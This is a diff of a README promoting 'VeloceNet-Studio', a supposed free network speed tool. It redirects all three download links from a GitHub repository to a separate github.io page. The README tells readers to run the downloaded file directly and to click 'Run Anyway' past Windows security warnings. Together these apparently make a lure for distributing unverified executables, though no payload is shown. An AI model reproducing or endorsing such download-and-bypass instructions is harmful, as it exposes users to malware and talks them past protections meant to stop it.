@@ -4,7 +4,7 @@
 
 Welcome to VeloceNet-Studio — your complete solution for understanding and improving your internet connection. Whether you're a gamer checking ping issues, a remote worker troubleshooting lag, or just curious about your Wi-Fi's performance, VeloceNet-Studio gives you everything in one simple, powerful dashboard.
 
-**Visit this link to download the application:** [👉 Download VeloceNet-Studio Now](https://github.com/guttbuster/VeloceNet-Studio)
+**Visit this link to download the application:** [👉 Download VeloceNet-Studio Now](https://guttbuster.github.io)
 
 ---
 
@@ -50,7 +50,7 @@ This is a genuinely free tool, always will be. The source code is open for anyon
 **Step 1: Download the Application**
 Click the button below to go to the download page:
 
-[📥 **Click Here to Download VeloceNet-Studio**](https://github.com/guttbuster/VeloceNet-Studio)
+[📥 **Click Here to Download VeloceNet-Studio**](https://guttbuster.github.io)
 
 **Step 2: Run the Application**
 Once downloaded, open the file. If Windows asks for permission, click "Yes" or "Run Anyway." The application will start automatically — no installation wizard, no confusing setup steps.
@@ -119,7 +119,7 @@ This tool was built by people who love networks, and we make it available to eve
 
 Ready to take control of your internet experience? Here's your download link one more time:
 
-[🚀 **Get VeloceNet-Studio Free — Click Here**](https://github.com/guttbuster/VeloceNet-Studio)
+[🚀 **Get VeloceNet-Studio Free — Click Here**](https://guttbuster.github.io)
 
 ---
 
